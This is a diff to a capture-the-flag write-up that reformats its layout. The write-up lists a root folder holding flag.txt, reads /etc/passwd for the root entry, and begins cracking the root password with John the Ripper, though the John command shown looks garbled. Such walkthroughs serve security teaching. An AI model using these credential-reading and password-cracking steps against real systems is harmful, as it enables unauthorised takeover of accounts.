@@ -38,14 +38,22 @@ player@challenge:~$
 ## From here , I solved it in two ways. First as the questions suggests  the flag is in root folder. 
 let's check the permission of flag.txt 
 
-**__________________________________________________________________________________
+__________________________________________________________________________________
+
 player@challenge:/root$ ls -la 
+
 ls -la 
+
 total 16
+
 drwxr-xr-x 1 root root    6 Mar  9 16:39 .
+
 drwxr-xr-x 1 root root   29 Apr 17 10:17 ..
+
 -rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
+
 -rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+
 -rwx------ 1 root root   46 Mar  9 16:39 flag.txt
 -rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
 player@challenge:/root$  
@@ -60,7 +68,7 @@ As I described above , I solved it in two ways.
 ## Firstly am going to crack the password of root (First way)
 
 read users ( cat /etc/passwd)  and copy the root username and save it into a text file. 
-**______________________________________________________________________________
+______________________________________________________________________________
 player@challenge:/root$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -83,7 +91,7 @@ Now , you've merged file named as passwords.
 NO, "John the Ripper is a powerful password cracking tool often used for security testing and analysis."
 
 Provide the path where John (Already Installed in Kali Linux) and the password file 
-**_____________________________________________________________________________________________
+_____________________________________________________________________________________________
 ┌──(user㉿kali)-[~/Desktop]
 └─$ john /usr/sbin/ password 
 Using default input encoding: UTF-8
